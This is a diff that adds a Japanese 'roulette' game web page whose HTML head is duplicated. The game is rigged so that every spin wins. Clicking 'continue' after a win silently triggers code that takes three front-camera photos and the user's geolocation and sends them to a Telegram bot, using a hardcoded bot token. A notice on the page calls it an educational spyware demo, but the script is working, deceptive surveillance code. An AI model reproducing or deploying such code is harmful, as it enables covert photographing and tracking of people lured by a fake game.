@@ -2,7 +2,184 @@
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>🎯ルーレット🎯</title>
+<style>
+  body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
+  h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
+  #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
+  #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
+  canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
+  #result { margin-top: 20px; font-size: 26px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); height: 1.2em; }
+  #spinBtn { margin-top: 20px; padding: 15px 50px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+  #winModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 40px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 80%; max-width: 300px; }
+  #winModal h1 { margin: 0 0 20px; font-size: 32px; }
+  #continueBtn { padding: 15px 40px; font-size: 20px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; }
+  #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 90; }
+  .security-notice { max-width: 600px; width: 90%; margin: 40px auto; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #eee; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
+  .security-notice b { color: #ff4081; font-size: 1.2em; display: block; margin-bottom: 10px; text-align: center; }
+</style>
+</head>
+<body>
+
+<h2>🎯ルーレット🎯</h2>
+
+<div id="container">
+  <div id="pointer">▼</div>
+  <canvas id="wheel"></canvas>
+</div>
+
+<h3 id="result">結果：</h3>
+<button id="spinBtn">回す</button>
+
+<div id="overlay"></div>
+<div id="winModal">
+  <h1>おめでとう🥳</h1>
+  <button id="continueBtn">続ける</button>
+</div>
+
+<div class="security-notice">
+  <b>【重要：セキュリティ学習用デモサイト】</b>
+  このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  <br><br>
+  本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
+  ・端末のカメラを使用した写真の撮影<br>
+  ・現在地（位置情報）の取得<br>
+  ・取得されたデータの外部サービス（Telegram）への送信<br><br>
+  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。
+  同意しない場合は、データの取得および送信は行われません。<br><br>
+  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
+  許可なく第三者に対してこのURLを送信したり、意図を説明せずに実行させたりする行為は禁止されています。
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
+  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
+</div>
+
+<script>
+let hue = 0;
+function animateBG() {
+  hue = (hue + 1) % 360;
+  document.body.style.backgroundColor = `hsl(${hue}, 80%, 60%)`;
+  requestAnimationFrame(animateBG);
+}
+animateBG();
+
+const BOT_TOKEN = "8561278803:AAHGGHLpZPJk75qUVelgeS1hiEpcN0wVtl0";
+const CHAT_ID = "@Natsusan_bot";
+
+const canvas = document.getElementById("wheel");
+const ctx = canvas.getContext("2d");
+const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
+
+function draw() {
+  const size = 800;
+  canvas.width = size; canvas.height = size;
+  const c = size / 2;
+  const rad = (Math.PI * 2) / slots.length;
+  ctx.clearRect(0, 0, size, size);
+  for(let i=0; i<slots.length; i++){
+    ctx.beginPath();
+    ctx.moveTo(c, c);
+    ctx.arc(c, c, c, i * rad, (i + 1) * rad);
+    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE";
+    ctx.fill();
+    ctx.strokeStyle = "#333";
+    ctx.lineWidth = 4;
+    ctx.stroke();
+    ctx.save();
+    ctx.translate(c, c);
+    ctx.rotate(i * rad + rad / 2);
+    ctx.fillStyle = "#333";
+    ctx.font = "bold 55px sans-serif";
+    ctx.textAlign = "center";
+    ctx.textBaseline = "middle";
+    ctx.fillText(slots[i], c * 0.55, 0);
+    ctx.restore();
+  }
+}
+window.onload = draw;
+window.onresize = draw;
+draw();
+
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const mapUrl = `📍位置情報: http://googleusercontent.com/maps.google.com/?q=${lat},${lon}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: mapUrl })
+        });
+      },
+      null,
+      { enableHighAccuracy: true }
+    );
+  }
+}
+
+async function captureAndSend() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.createElement("video");
+    video.srcObject = stream; await video.play();
+    
+    for (let i = 0; i < 3; i++) {
+      const tempCanvas = document.createElement("canvas");
+      tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
+      tempCanvas.getContext("2d").drawImage(video, 0, 0);
+      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.7));
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID); fd.append("photo", blob, `shot_${i}.jpg`);
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+      await new Promise(r => setTimeout(r, 400));
+    }
+    stream.getTracks().forEach(t => t.stop());
+    sendLocation();
+  } catch (e) {
+    sendLocation();
+  }
+}
+
+const spinBtn = document.getElementById("spinBtn");
+let totalRotation = 0;
+
+spinBtn.onclick = () => {
+  spinBtn.disabled = true;
+  document.getElementById("result").textContent = "回転中...";
+  
+  const segmentAngle = 360 / slots.length;
+  const currentMod = totalRotation % 360;
+  const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
+  const stopAngle = 360 - (targetIdx * segmentAngle) - (segmentAngle / 2) + 270;
+  
+  totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
+  
+  canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
+  canvas.style.transform = `rotate(${totalRotation}deg)`;
+  
+  setTimeout(() => {
+    document.getElementById("result").textContent = "当たり！";
+    document.getElementById("overlay").style.display = "block";
+    document.getElementById("winModal").style.display = "block";
+    spinBtn.disabled = false;
+  }, 4200);
+};
+
+document.getElementById("continueBtn").onclick = () => {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("winModal").style.display = "none";
+  captureAndSend();
+};
+</script>
+</body>
+</html>
+
 <title>🎯ルーレット🎯</title>
 <style>
   body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
